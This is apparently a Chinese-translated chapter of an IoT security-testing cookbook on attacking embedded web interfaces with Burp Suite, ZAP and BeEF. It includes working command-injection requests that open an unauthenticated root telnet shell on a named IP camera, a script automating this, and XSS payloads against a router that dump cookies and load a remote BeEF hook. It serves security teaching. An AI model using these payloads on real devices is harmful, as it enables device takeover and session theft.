# 第四章：利用嵌入式 Web 应用程序

在本章中，我们将涵盖以下内容：

+   开始进行 Web 应用程序安全测试

+   使用 Burp Suite

+   使用 OWASP ZAP

+   利用命令注入

+   利用 XSS

+   利用 CSRF

# 介绍

Web 应用程序和 Web 服务用于执行远程访问功能以及管理设备。Web 应用程序和 IoT 设备可以赋予大量的权力，使攻击者能够远程执行控制。某些产品，如连接的车辆或具有远程可执行漏洞的智能门锁，可能会对用户造成伤害和个人安全风险。在测试 IoT 产品的上述类别时，首先要针对对用户造成最高风险和影响的漏洞进行定位。在本章中，我们将展示如何选择 Web 应用程序测试方法论，设置您的 Web 测试工具包，以及讨论如何发现和利用一些最常见的嵌入式 Web 应用程序漏洞。

# 开始进行 Web 应用程序安全测试

现代 Web 的大部分运行在数百个 Web、应用程序和数据库服务器后面作为其后端系统的应用程序上。Web 已经从静态 HTML 页面发展到需要更多资源来计算的复杂的异步应用程序。尽管 Web 已经发生了变化，但一些最常见的安全问题仍然存在。在 1990 年代首次发现的漏洞仍然是相关的，并且正在积极被利用。在 IoT 产品中，一些常见的漏洞通常是命令注入、**跨站脚本**（**XSS**）、目录遍历、身份验证绕过、会话劫持、**XML 外部实体**（**XXE**）、**跨站请求伪造**（**CSRF**）和其他业务逻辑缺陷。在这个方法中，我们将建立一个 Web 应用程序测试方法论，用于发现和利用 IoT Web 应用程序和 Web 服务的漏洞。

# 如何做…

要开始评估 Web 应用程序，建立方法论甚至一份清单是很重要的，一旦您掌握了一些技巧。了解您的方法和上下文应用风险对于成功破坏安全控制至关重要。在我们建立与目标应用程序相关的方法论之后，我们将开始配置我们的 Web 测试环境和工具包，以开始进行 Web 应用程序安全测试。

# Web 渗透测试方法

除了网络渗透测试方法之外，还有许多其他的渗透测试方法。并不存在绝对正确或错误的方法论；然而，建立测试应用程序的方法对于成功发现软件缺陷至关重要。最常见的方法论是**渗透测试执行标准**（**PTES**）和 OWASP 的 Web 应用程序渗透测试方法论。**开放式 Web 应用安全项目**（**OWASP**）是一个非营利性慈善组织，提供工具和文件，并在国际上倡导软件安全。如果您曾经测试过一个应用程序或不得不修复软件漏洞，您可能已经熟悉 OWASP。如果您曾经进行过渗透测试，您可能也遇到过 PTES。PTES 旨在为渗透测试提供一个基准。PTES 将渗透测试定义为包括以下七个阶段的测试：

1.  预交互

1.  情报收集

1.  威胁建模

1.  漏洞分析

1.  利用

1.  后期利用

1.  报告

尽管 PTES 与信息安全测试的所有领域相关，但它最常用于面向网络的渗透测试。虽然有关 Web 安全的小节，但目前还不足以进行成功的评估。PTES 确实为方法论的每个阶段提供了详细的实际示例，并包括工具使用示例。另一方面，OWASP 的 Web 应用程序渗透测试方法论纯粹针对 Web 应用程序渗透测试。OWASP 的 Web 应用程序渗透测试方法论包括以下 12 个类别：

+   介绍和目标

+   信息收集

+   配置和部署管理测试

+   身份管理测试

+   身份验证测试

+   授权测试

+   会话管理测试

+   输入验证测试

+   错误处理

+   密码学

+   业务逻辑测试

+   客户端测试

与 PTES 类似，OWASP 的测试方法提供了每个阶段的许多示例，包括屏幕截图以及工具参考和用法。当某些领域的经验较低时，具有与测试目标应用程序相关的示例是有帮助的。OWASP 测试方法的一大优点是提供了特定测试方法的上下文，以尝试用例和测试视角，例如黑盒或灰盒。OWASP 被认为是应用程序安全指南和测试的事实标准组织。如果有疑问，请查看 OWASP 测试指南或它们的各种小抄系列以寻求帮助。

# 选择您的测试工具

有许多可用于测试 Web 应用程序的工具。组装用于评估 Web 应用程序的工具箱的第一步将是选择浏览器并自定义其配置以进行测试。由于其许多可用的测试附加组件，常用于测试的浏览器是 Firefox。也可以使用其他浏览器，并且可能需要一些应用程序，例如使用 ActiveX 或 Silverlight 的应用程序，需要 Internet Explorer 浏览器才能运行。一些附加组件使测试变得更加轻松和高效。常用的有用附加组件包括以下内容：

+   **FoxyProxy**：用于管理 Chrome 和 Firefox 的浏览器代理设置的工具。有时您可能同时运行多个代理工具，并且可能需要在两者之间切换。FoxyProxy 可以帮助更改代理设置，而无需点击多个浏览器设置菜单。FoxyProxy 可以在[`addons.mozilla.org/en-us/firefox/addon/foxyproxy-standard/`](https://addons.mozilla.org/en-us/firefox/addon/foxyproxy-standard/)下载。

+   **Cookie Manager+**：Cookie 管理器对于编辑 cookie 值和查看其属性非常有用。有许多适用于 Firefox 和 Chrome 的 cookie 管理器附加组件。Firefox 的常见 cookie 管理器是 Cookie Manager+。Cookie Manager+可以在 https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/下载。

+   **Wappalyzer**：为了更好地了解目标应用程序，了解正在使用的组件是很有帮助的。Wappalyzer 是一个附加组件，可帮助揭示正在使用的技术，包括 Web 服务器、框架和 JavaScript 库。Wappalyzer 可以在 https://wappalyzer.com/download 下载到 Firefox 和 Chrome。

选择浏览器后，必须配置代理设置，以便在 Web 应用程序代理工具中查看应用程序的请求和响应。在接下来的步骤中，我们将介绍配置代理设置和 Web 应用程序代理工具。

# 使用 Burp Suite

Burp Suite 是用于评估 Web 应用程序的最流行的 Web 代理工具之一。Burp 是基于 Java 的跨平台工具。使用 Burp Suite，可以中间人攻击 HTTP 请求和响应，以便篡改并监视应用程序行为。此外，应用程序可以进行蜘蛛爬行，主动扫描漏洞，被动扫描和模糊处理。

# 准备就绪

Burp Suite 已经预装在为本书准备的虚拟机中；但是，也可以在[`portswigger.net/burp/`](https://portswigger.net/burp/)上下载。

Burp 有两个版本：免费版和专业版。专业版的价格适中（349.00 美元），考虑到 Burp 的功能集。还有一个为期 2 周的专业版试用版。免费版允许代理 HTTP 请求和响应，以及下载 BApp 商店中的一些扩展插件。专业版允许使用更高级的功能和专业的扩展插件。

# 如何做…

我们将介绍 Burp Suite 的基本用法，以开始测试嵌入式 Web 应用程序。以下示例将使用 Burp Suite 专业版；但是，相同的设置步骤也适用于免费版：

1.  设置 Burp 代理监听器设置为`127.0.0.1`，端口为`8080`，如下图所示：

![](img/5ab04475-9738-48f9-8a02-ca5f7d2f8aea.png)

1.  使用 FoxyProxy 将浏览器代理设置为我们在上一步中设置的 Burp Suite 监听器地址：

![](img/1c75e385-9c69-413c-874b-2d40f9c6f692.png)

1.  选择配置的代理以将所有流量路由到我们的 Burp 代理监听器：

![](img/16663d82-4c91-462f-9392-9b3cb8c7f417.png)

1.  接下来，我们需要下载并安装 Burp 的 CA 证书，方法是转到`http://burp/cert`，将证书保存在一个文件夹中，并将证书导入浏览器的证书管理器中。导入 Burp 的 CA 证书允许代理 HTTPS 连接，这在将来可能会派上用场：

![](img/d394bec0-e6a7-407c-8484-4109e37db384.png)

1.  在 Firefox 中导航到`about:preferences#advanced`，选择证书，然后选择授权机构：

![](img/f38711f7-1d8b-42db-95b0-d2cdc78ab708.png)

1.  单击“导入…”按钮，然后选择本地保存的 Burp Suite 证书：

![](img/0468ca2b-36b5-455f-996e-3c5ec8af99a0.png)

现在我们可以查看 HTTP/HTTPS 请求和响应。

1.  一旦我们为浏览器和 Burp Suite 配置了基本代理设置，就导航到目标 Web 应用程序。右键单击其地址并选择添加到范围，将我们的目标应用程序添加到范围，如下图所示：

![](img/053deda8-7603-4721-a3c8-4070db6fc438.png)

1.  选择范围后，可以通过右键单击请求并选择执行主动扫描来使用 Burp 的扫描引擎扫描请求：

![](img/32fb5ab3-dcb5-4fa2-aaea-03be79890bf6.png)

1.  通过导航到扫描队列查看扫描结果：

![](img/c01b5144-1b24-4680-b86e-d91a1303f322.png)

1.  有时，我们可能希望使用重复器重放请求，以观察应用程序响应或调整有效载荷。这可以通过右键单击目标请求并将其发送到重复器来完成。以下截图显示了使用有效载荷调整`alias`参数：

![](img/5faec337-291f-4c7c-b1b9-ced6e1550d6c.png)

1.  在调整有效载荷的过程中，我们可能需要对某些字符进行编码或解码，以确保我们的有效载荷能够使用 Burp Suite 的解码器执行。以下截图显示了一个解码值（顶部）被 URL 编码（底部）：

![](img/02b7e4ff-8973-45ff-b9ad-319f891921b6.png)

1.  使用 Burp Suite 的入侵者可以以更手动的方式对具有特定目标有效载荷的参数进行模糊处理。首先，需要指定一个目标参数。在这种情况下，我们使用`alias`参数作为目标：

![](img/c9d6df39-b119-4c59-b10d-316a208dee36.png)

1.  接下来，选择要使用的攻击有效载荷（在本例中为 Fuzzing - XSS），然后单击开始攻击：

![](img/be2b63cd-033d-4fee-90d1-14cfaffacd59.png)

将会弹出一个单独的窗口，攻击结果将可见：

![](img/dbd3005f-0a49-4206-b819-f8c10c75bd27.png)

# 它是如何工作的…

在我们的设置步骤中，我们配置了 Burp 代理设置和浏览器设置，并学习了将用于测试的 Burp Suite 的基础知识。我们使用 FoxyProxy 配置了浏览器代理设置，安装了 Burp 的 CA 证书，扫描了一个请求，并展示了如何使用其他可能有助于更多目标攻击的 Burp 工具，比如 Repeater、decoder 和 Intruder。

有了这些知识，我们现在可以开始使用 Burp Suite 访问嵌入式 Web 应用程序，以查找目标设备上的漏洞。

# 还有更多...

Burp Suite 有一个强大的社区支持。当发现新的攻击技术时，社区会创建许多附加扩展。Burp Suite 本身也是如此。PortSwigger 通过不断更新 Burp 来保持领先地位。看看各种发布说明，你可能会学到一两件事情（[`releases.portswigger.net/`](http://releases.portswigger.net/)）。

# 有用的入侵者有效载荷

在使用 Intruder 时，最好准备一组用于模糊参数的有针对性的有效载荷。SecList 项目有许多单词列表以及用于更有针对性攻击的模糊有效载荷。该项目定期更新，社区贡献有助于测试。SecList 存储库可以通过 URL [`github.com/danielmiessler/SecLists/`](https://github.com/danielmiessler/SecLists/)找到。

# 另请参阅

+   如果你发现自己需要为定制目的创建宏或附加组件，请查看 Burp 的可扩展 API，网址为[`portswigger.net/burp/extender/`](https://portswigger.net/burp/extender/)。

# 使用 OWASP ZAP

OWASP **Zed Attack Proxy** (**ZAP**)是一个免费的跨平台 Web 代理测试工具，用于发现 Web 应用程序中的漏洞。ZAP 在 Web 应用程序代理测试工具领域是 Burp Suite 的紧密竞争对手，当你的预算可能不足以购买商业产品的许可证时，ZAP 绝对是一个不错的选择。ZAP 旨在供具有广泛安全经验的人使用，因此也非常适合开发人员以及对渗透测试新手的功能测试人员。借助 ZAP 的 API，扫描可以自动化，并在开发人员的工作流程中用于在生产之前扫描构建。ZAP 有许多不同的有用附加组件，具有强大的扫描引擎，其中包括引擎内的其他经过验证的测试工具，如 Dirbuster 和 SQLmap。此外，ZAP 还有一种名为 ZEST 的图形化脚本语言，可以记录和重放类似于宏的请求。本教程将介绍用于 Web 应用程序安全测试的基本 ZAP 功能。

# 准备工作

Burp Suite 预装在为菜谱准备的虚拟机中；但是，也可以通过[`github.com/zaproxy/zaproxy/wiki/Downloads`](https://github.com/zaproxy/zaproxy/wiki/Downloads)下载。

ZAP 下载页面包含额外的 Docker 镜像，以及利用新功能的 ZAP 每周版本，这些功能在官方版本中尚未引入。每周版本非常稳定，如果您希望获得更多的可扩展性，我建议您尝试一下。

# 如何做...

以下步骤将介绍 ZAP 的设置和基本用法：

1.  通过单击“工具”，然后单击“选项”来设置 ZAP 代理监听器设置。输入 ZAP 要监听的 IP 和端口信息，如下截图所示：

![](img/fb263bcd-8773-464d-92c6-1b7bc38bd6d1.png)

1.  通过动态 SSL 证书选项生成和安装 ZAP 的 CA 证书，并在浏览器中安装证书，类似于你在 Burp Suite 教程中所做的：

![](img/71c9b102-a12e-4392-9a2d-9390a01c450a.png)

1.  将证书保存在已知目录中：

![](img/6e52f310-3823-4d8b-9587-4b93a9612454.png)

1.  有必要安装附加组件来协助主动和被动的网络渗透测试。这些附加组件包括高级 SQL 注入扫描器、主动扫描规则（alpha）、DOM XSS 主动扫描规则、被动扫描规则（alpha）和使用 Wappalyzer 进行技术检测。ZAP 的附加组件有不同的成熟度级别，但使用 alpha 级别的附加组件并不会有害。下面的截图说明了必要的附加组件：

![](img/bfd962bc-aedd-46c3-8dbf-047275b0e390.png)

1.  安装了所需的附加组件后，现在可以通过分析和扫描策略管理器选项来配置扫描策略。这些策略也可以导出和导入。下面的截图显示了一个用于 XSS 的示例扫描策略：

![](img/8d08cc6f-ac66-405b-9e02-ef621a203ac1.png)

ZAP 的扫描策略包含阈值和强度。阈值涉及警报的置信度以及 ZAP 报告潜在漏洞的可能性。强度涉及 ZAP 执行攻击的数量。这些信息可以在 ZAP 的用户指南中找到，该指南位于工具本身或在线[`github.com/zaproxy/zap-core-help/wiki`](https://github.com/zaproxy/zap-core-help/wiki)。

1.  配置了我们的扫描配置后，我们需要通过右键单击目标将目标站点添加到上下文中，如下面的截图所示。这类似于 Burp 的“添加到范围”功能：

![](img/88e0ab44-58cc-483d-b55c-8192fc0e7488.png)

1.  现在目标已经包含在扫描上下文中：

![](img/63ac437e-c29e-4d52-bb9a-fbf1f55d6fd5.png)

1.  扫描请求是通过右键单击目标请求，选择扫描策略，并开始扫描来完成的，如下面的截图所示：

![](img/335ee3fc-f922-4ea2-bd9b-7fe33af67715.png)

选择了 XSS 扫描策略，现在扫描将开始，并且扫描的输出将显示在 ZAP 的“主动扫描”选项卡中。

![](img/5bf5c0a4-3580-4a5a-a47c-7184e178c0d8.png)

1.  为了更有针对性地进行主动扫描，可以利用 ZAP 的模糊测试功能，这类似于 Burp 的 Intruder。要进行模糊测试，请右键单击请求并选择模糊测试位置和有效载荷，如下面的截图所示：

![](img/5f7d9c14-7016-4d24-856e-fd6e7ff3f692.png)

1.  解码和编码字符对于代码执行至关重要。ZAP 的编码器/解码器，可通过工具菜单访问，与 Burp 的解码器类似，如下面的截图所示：

![](img/f46f40f5-8bc5-42bc-abf8-a8a7fdf353b1.png)

# 还有更多...

ZAP 非常可定制和可扩展；我们上一个示例只涵盖了 ZAP 的基本用法，以帮助进行 Web 应用程序安全测试。要了解更多关于使用和定制 ZAP 的信息，请访问 ZAP 的博客以及他们的维基，网址为[`github.com/zaproxy/zaproxy/wiki`](https://github.com/zaproxy/zaproxy/wiki)和[`zaproxy.blogspot.com/`](https://zaproxy.blogspot.com/)。

此外，如果您想要通过 ZAP 或 Burp Suite 来提高您的网络应用程序测试技能，请查看 OWASP 的易受攻击的 Web 应用程序目录项目，网址为[`www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project`](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)。

# 利用命令注入

在嵌入式系统中，OS 命令注入是一种常见的漏洞，通常通过 Web 界面或调试页面留下来自开发固件构建的方式来执行任意操作系统命令。用户通过 Web 界面在 Web 服务参数中提供操作系统命令，以执行 OS 命令。动态且未经适当清理的参数容易受到此漏洞的利用。通过执行 OS 命令的能力，攻击者可以上传恶意固件，更改配置设置，获得对设备的持久访问权限，获取密码，攻击网络中的其他设备，甚至锁定合法用户对设备的访问。在这个步骤中，我们将演示如何利用命令注入来获取对设备的 shell 访问权限。

# 准备工作

对于这个步骤，我们将使用 tcpdump、Burp Suite 和一个易受攻击的 IHOMECAM ICAM-608 IP 摄像头。Tcpdump 包含在大多数*Nix 操作系统中，但也可以使用 Wireshark 来观察数据包。

# 如何做...

在嵌入式 Web 应用程序中查找可注入命令的页面的过程相当简单。我们要检查的应用程序中的第一个地方是使用系统命令的诊断页面，比如`ping`或`traceroute`，还有守护程序的配置设置页面，比如 SMB、PPTP 或 FTP。如果我们已经获得了固件或者访问了目标设备的控制台，最好是静态分析设备执行的易受攻击脚本和函数，并验证通过动态分析发现的潜在发现：

1.  让我们来看一下我们目标 IP 摄像头的配置菜单设置，以确定可能存在漏洞的页面：

![](img/9675cb0f-af21-474c-8094-1b0c3c4f8d1d.png)

1.  可选择的页面并不多，但我们看到了邮件服务和 FTP 服务设置页面。这些页面可能会将系统命令输入操作系统以执行。让我们首先检查 FTP 服务设置页面，并尝试通过 Burp Suite 操纵参数值以执行系统命令：

![](img/e6c1d0f6-2898-4872-9721-cd5ed3b1054c.png)

1.  在尝试在`pwd`参数中发送有效负载`$(ping%20192.168.1.184)`时，应用程序似乎会剥离字符，如下面的屏幕截图所示：

![](img/81a56e3b-bea5-4e4d-b597-4c9d9b98a8b8.png)

1.  使用基本命令，比如`ping`，将有效负载发送到我们的主机计算机，这让我们知道我们的命令已成功执行。为了观察 ping 是否已执行，设置`tcpdump`来监听来自我们目标 IP 摄像头的 ICMP 数据包，使用以下命令：

```
$ tcpdump host 192.168.1.177 and icmp
```

1.  使用 Burp Suite 的 Repeater，我们可以更改数值并绕过 IP 摄像头执行的客户端检查。使用以下请求，我们可以看到应用程序接受了我们的更改，并需要根据 HTTP 响应刷新`ftp.htm`页面：

```
RAW HTTP Request  
GET 
/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(ping%20192.168.1.184)&dir=/&mode=0&upload_interval=0 HTTP/1.1 

RAW HTTP Response 
HTTP/1.1 200 OK 
Server: GoAhead-Webs 
Content-type: text/html 
Cache-Control:no-cache 
Content-length: 194 
Connection: close 

<html> 

<head> 

<title></title> 

<meta http-equ"v="Cache-Cont"ol" conte"t="no-cache, must-reva lid"te"><meta http-equ"v="refr"sh" conte"t="0; url=/ftp."tm" /> 

</head> 

<body> 

</body> 

<html> 
```

1.  刷新到`ftp.htm`页面后，我们观察到 ICMP 数据包被发送到我们的主机计算机：

```
$ tcpdump host 192.168.1.177 and icmp

15:27:08.400966 IP 192.168.1.177 > 192.168.1.184: ICMP echo request, id 42832, seq 0, length 64
15:27:08.401013 IP 192.168.1.184 > 192.168.1.177: ICMP echo reply, id 42832, seq 0, length 64
15:27:09.404737 IP 192.168.1.177 > 192.168.1.184: ICMP echo request, id 42832, seq 1, length 64
15:27:09.404781 IP 192.168.1.184 > 192.168.1.177: ICMP echo reply, id 42832, seq 1, length 64
15:27:10.666983 IP 192.168.1.177 > 192.168.1.184: ICMP echo request, id 42832, seq 2, length 64
15:27:10.667031 IP 192.168.1.184 > 192.168.1.177: ICMP echo reply, id 42832, seq 2, length 64  
```

1.  现在我们知道`pwd`参数容易受到命令注入的攻击，我们的下一个目标是获取对目标设备的 shell 访问权限。我们知道 IP 摄像头包含基于 FTP 的传统守护程序，很可能也使用 Telnet。接下来，我们将调用 Telnet 在端口`25`上启动，并使用以下有效负载在没有用户名或密码的情况下进入 shell：

```
/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd -p25 -l/bin/sh)&dir=/&mode=PORT&upload_interva'=0'  
```

1.  我们还知道应用程序需要刷新`ftp.htm`页面以保存设置，但是在查看页面源代码时，它调用了一个名为`ftptest.cgi`的 CGI，执行我们的有效负载。以下是从`ftp.htm`页面执行我们的有效负载的代码片段：

```
function ftp_test() {              
   var url;              
   url'= 'ftptest.cgi?next_url=test_ftp.'tm';              
   url '= '&loginu'e=' + top.cookieuser'+ '&loginp's=' + encodeURIComponent(top.cookiepass);              
   window.open(ur"" """ "")         } 
```

1.  接下来，我们可以直接调用`ftptest.cgi`来保存我们的设置，使用以下`GET`请求：

```
/ftptest.cgi?next_url=test_ftp.htm&loginuse=admin&loginpas=ad'in'  
```

1.  Telnet 现在在端口`25`上运行，并给我们一个 root shell：

```
$ telnet 192.168.1.177 25
Trying 192.168.1.177...
Connected to 192.168.1.177.
Escape character 's '^]'.

/ # id
uid=0(root) gid=0
/ # mount
rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro,relatime)
/proc on /proc type proc (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
tmpfs on /dev type tmpfs (rw,relatime,size=2048k)
tmpfs on /tmp type tmpfs (rw,relatime,size=5120k)
devpts on /dev/pts type devpts (rw,relatime,mode=600,ptmxmode=000)
/dev/mtdblock3 on /system type jffs2 (rw,relatime)
/ # uname -a
Linux apk-link 3.10.14 #5 PREEMPT Thu Sep 22 09:11:41 CST 2016 mips GNU/Linux

```

1.  在设备的 LAN 上获得 shell 权限后，可以使用各种技术进行后期利用。本教程不涵盖后期利用技术；然而，我们可以轻松地编写命令注入有效负载的脚本，以确保使用以下 bash 脚本访问：

```
#!/bin/sh  
wget -q'- 'http://192.168.1.177/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd -p25 -l/bin/sh)&dir=/&mode=PORT&upload_interval=0'  
wget -qO- 'http://192.168.1.177/ftptest.cgi?next_url=test_ftp.htm&loginuse=admin&loginpas=admin' 
telnet 192.168.1.177 25  
```

在这个教程中，我们介绍了在 IHOMECAM ICAM-608 IP 摄像头上发现和利用命令注入。我们能够获得 shell 访问权限，并创建一个脚本来自动化利用命令注入。

# 另请参阅

+   要了解更多关于查找和预防命令注入的信息，请参考 OWASP 的命令注入维基页面（[`www.owasp.org/index.php/Command_Injection`](https://www.owasp.org/index.php/Command_Injection)）以及 OWASP 的嵌入式应用安全项目（[`www.owasp.org/index.php/OWASP_Embedded_Application_Security`](https://www.owasp.org/index.php/OWASP_Embedded_Application_Security)）。

# 利用 XSS

XSS 是一种攻击类型，它从不受信任的来源执行和注入任意 JavaScript 到受信任网站的上下文中。当攻击者发现 Web 应用程序中存在一个漏洞参数，可以在不验证或输出编码字符的情况下执行动态内容并将内容呈现给用户时，XSS 攻击就会发生。XSS 攻击利用浏览器的能力传输攻击有效负载，因为浏览器认为代码是受信任的。XSS 漏洞有三种类型：反射型（最常见），存储型和基于 DOM 的。反射型 XSS 漏洞是在不对内容进行消毒的情况下，将参数数据复制并回显到应用程序的响应中产生的。存储型 XSS 漏洞是当应用程序允许将参数输入数据存储在应用程序的数据库中以供以后使用时产生的。**文档对象模型**（**DOM**）XSS 漏洞是当来自参数的数据通过 JavaScript 函数被馈送到 DOM 元素中时产生的。

成功利用 XSS 的攻击者可以做到以下几点：

+   关键日志数据

+   攻击受害者的本地区域网络（LAN）

+   将所有 Web 流量代理通过受害者，称为**浏览器中间人**（**MITB**）

+   窃取或修改应用程序的 cookie 以进行会话劫持

+   修改受害者应用程序的外观

+   绕过 CSRF 安全控制

要成功攻击受害者，攻击者需要执行某种社会工程技术，以使用户执行恶意请求。XSS 攻击的常见社会工程方法包括以下几种：

+   创建一个带有恶意 JavaScript 的假网站，并链接到其页面

+   发送嵌入恶意 Web URL 的电子邮件

+   使用 URL 缩短器掩盖 URL

在每种情况下，初始 URL 将链接到受信任的受害者网站，并且将在用户不知情的情况下异步执行恶意 JavaScript 代码。在这个教程中，我们将介绍发现和利用反射型 XSS 漏洞，从而完全控制受害者浏览器。

# 准备工作

对于这个教程，我们将使用 OWASP ZAP，**浏览器利用框架**（**BeEF**）和一个易受攻击的 RT-N12 ASUS 路由器。BeEF 可以通过[`beefproject.com`](http://beefproject.com)安装，或者在默认安装了 BeEF 的 Kali Linux 虚拟机中使用。

# 如何做...

在尝试查找反射型 XSS 漏洞时，我们首先观察参数输入行为，看数据是否反射回用户。OWASP ZAP 和 Burp Suite 等 Web 代理可以帮助自动化发现过程，使用它们的扫描引擎：

1.  浏览应用程序以查找潜在的反射值。通常可以探测的地方是诊断页面、故障排除或更改嵌入式设备上运行的服务或守护进程的配置页面。以下屏幕截图显示了发现 Web 漏洞的潜在起点：

![](img/d8c989d0-42ca-4330-a072-d11264aaf784.png)

1.  代理 ZAP 中的 HTTP 请求，并对此页面的配置进行更改。您应该看到 POST 主体参数如下图所示：

![](img/7633b956-938c-4db3-94b1-b10db94b9ad5.png)

1.  审查`start_apply.htm`源代码，发现一些可能通过连接 JavaScript 代码进行操作的动态变量。这些变量似乎是作为请求的`POST`主体发送的参数，但也可以通过`GET`请求发送。以下是`start_apply.htm`中`next_page`的可能可注入参数值的片段：

```
setTimeout("top_delay_redirect('"+next_page+"');", restart_time*1000);
<snip>
setTimeout("parent.parent.location.href='"+next_page+"';", (restart_time+2)*1000);
<snip>
else if(next_page.length > 0){
setTimeout("delay_redirect('"+next_page+"');", restart_time*1000);

```

使用 XSS 负载的模糊参数，我们可以手动注入 XSS 负载并观察响应，但我们也可以利用诸如 SecLists 之类的已知 XSS 负载与单词列表，以加快发现过程。

1.  根据 ZAP 中的模糊结果，我们在 HTTP 响应中看到了一些反射参数，如下图所示：

![](img/23539223-f5c8-4c98-9e52-1b719528c184.png)

1.  我们可以看到`next_page`参数反映了我们精确的模糊输入值(`<script>(document.head.childNodes[3].text)</script>`)，如下 HTTP 响应片段所示：

![](img/ba67e021-85c2-4b02-bfb1-129fbfaa864d.png)

1.  让我们手动在浏览器中输入这个反射参数，观察其响应：

![](img/5c82cc2b-d804-4f6d-aa3c-7e240e775c8b.png)

根据响应，我们似乎破坏了一些 JavaScript 代码。这可能与负载的编码或可能的长度有关。我们需要调整编码字符并审查 JavaScript 代码，确保我们的代码开始或结束一个可能正在使用的函数。

1.  使用基本的警报 XSS 负载进行发现时，请记住在`start_apply.html`源代码中，参数值的形式如下：

```
'"+next_page+"'
```

1.  让我们使用 ZAP 的编码器/解码器工具来调整我们的基本 XSS 负载，如下所示：

![](img/f2e101c9-017b-42b6-87b1-7653dc17fec7.png)

1.  通过 Web 界面将 URL 编码值插入易受攻击的参数，现在我们的警报代码成功执行。最好先尝试在警报框中插入一个整数，看看我们的代码是否先执行，然后再深入研究更复杂的 XSS 负载：

![](img/e4fa7004-3f96-47af-97b7-4c17d1fb1c83.png)

1.  现在让我们更进一步，使用以下负载在警报框中转储任何 cookie：

```
'%2balert(document.cookie)%2b'
```

1.  现在我们可以看到在我们的浏览器中呈现出`IoTCookbook=1234567890`的 cookie 值，使用基本的`alert(document.cookie)`负载：

![](img/5917c0dd-44e6-4ceb-98bc-7d0962aa5415.png)

太棒了！我们现在知道我们可以在这一点上进行一些基本的 XSS 负载。幸运的是，我们还没有遇到任何字符限制或任何类型的过滤。让我们看看我们是否可以造成更多的损害，并将 BeEF 钩负载插入到易受攻击的参数中。毕竟，警报框会带来什么风险呢？

# 使用 BeEF XSS 负载的介绍

BeEF 是一个利用 Web 浏览器和客户端攻击向量的工具，通过易受攻击的应用程序参数和社会工程技术在受害者环境中钩取一个或多个 Web 浏览器。当受害者执行了它的负载时，BeEF 将钩取一个或多个 Web 浏览器，然后可以利用多个命令模块进行进一步的利用。接下来的部分将扩展我们发现的 XSS 漏洞，使其执行 BeEF 钩，并介绍一些基本用法。

BeEF 很强大，展示了 XSS 的影响力：

1.  现在我们已经演示了基本的 XSS 负载执行，我们将尝试使用类似格式的 BeEF 负载进行`GET`请求：

```
http://192.168.1.1/start_apply.htm?next_page= '+<script src=//172.16.100.139:3000/hook.js></script>+' 
```

1.  使用这个`GET`请求，我们可以看到浏览器响应一个损坏的页面，如下图所示：

![](img/8f20f997-5804-4dfb-8490-e2bd459956a4.png)

1.  再次，我们正在破坏一些 JavaScript 代码，阻止浏览器执行我们在 BeEF 服务器上托管的外部 JavaScript 代码。很可能我们需要终止预期的 JavaScript 代码，并开始我们自己的`<script>`标签，以请求我们的外部 JavaScript BeEF。我们可以尝试添加一个带有打开和关闭脚本标签括号的参数，添加引号，然后尝试使用以下`GET`请求调用我们的 BeEF 钩有效负载：

```
http://192.168.1.1/start_apply.htm?next_page=param<script></script>+"<script src=http://172.16.100.139:3000/hook.js></script>
```

1.  当我们发送`GET`请求并查看浏览器响应时，似乎输出相同的破损 JavaScript；但是，如果我们查看 ZAP，我们可以看到浏览器向我们的 BeEF 服务器发送请求：

![](img/0e4d47ed-73f8-4246-99b6-18f7b14c7bd3.png)

1.  以下是 ZAP 历史选项卡中显示的 BeEF 钩请求：

![](img/874c69c1-28ec-4c5c-af61-0a06d6c75255.png)

1.  从 BeEF 服务器，我们已成功用我们的有效负载钩住了我们的浏览器，如下面的屏幕截图所示：

![](img/84dc7381-1e28-4346-9c3b-8513ab31358e.png)

# 钩住受害者时 BeEF 的基本使用

以下是钩住受害者时 BeEF 的基本使用：

1.  一旦受害者被钩住，BeEF 会快速枚举运行在受害者计算机上的信息。

以下屏幕截图说明了 BeEF 捕获的内容：

![](img/7e372f36-35c1-4f4f-a1ac-6c5f376f7f63.png)

1.  除了主机详细信息，BeEF 还使用许多利用模块在受害者身上使用，如下面的屏幕截图所示：

![](img/95723930-53b5-44b3-afb0-5afec8d5fbdb.png)

1.  网络类别中的一个模块可以扫描受害者的端口以进行后期利用：

![](img/e7308456-d9aa-4794-a8d9-28e5bafa6e1a.png)

# 通过受害者的浏览器代理流量

BeEF 的我最喜欢的功能之一是能够使用受害者作为代理，代表用户发送伪造请求：

1.  这就像右键单击被钩住的受害者以用作代理一样简单，导航到 Rider 选项卡，并使用 Forge Request 选项，如下面的屏幕截图所示：

![](img/22b6a1a5-8afd-4e62-824b-a593a1dfbc9d.png)

1.  复制已知的`HTTP`请求，通过受害者的浏览器伪造，例如创建或更改管理员用户的密码，如下面的屏幕截图所示：

![](img/75c54380-421e-4c78-a096-3434c0eb51c6.png)

1.  在历史选项卡中查看伪造的响应：

![](img/85c6f421-d3d9-405d-9bc9-fa9d95d49a18.png)

1.  当伪造的请求被双击时，将打开另一个选项卡，显示伪造请求的路径和`HTTP`响应，如下面的屏幕截图所示：

![](img/535439ce-c485-47cc-9bb0-5458a79d1cf0.png)

在这个示例中，我们演示了如何发现易受攻击的 XSS 参数，审查编码考虑因素，解剖 JavaScript 代码，讨论了基本 XSS 有效负载的使用，并利用了 BeEF 钩的跨站脚本漏洞。当 BeEF 钩住受害者时，有许多可能性和利用技术可供使用。

# 还有更多...

有关 BeEF 模块和高级功能的详细信息，请访问 BeEF 的 GitHub 维基页面，网址为[`github.com/beefproject/beef/wiki`](https://github.com/beefproject/beef/wiki)。

# 另请参阅

